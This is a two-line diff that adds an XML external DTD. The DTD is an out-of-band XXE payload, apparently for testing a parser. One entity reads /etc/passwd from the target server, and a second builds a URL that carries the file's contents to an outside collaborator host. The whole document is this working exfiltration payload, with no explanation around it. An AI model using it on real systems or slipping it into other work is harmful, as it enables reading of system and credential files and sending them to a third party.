@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://f3j7760cli690jcqwda1qv17lyrufj.collab.lsg.dev/?%data;'>">
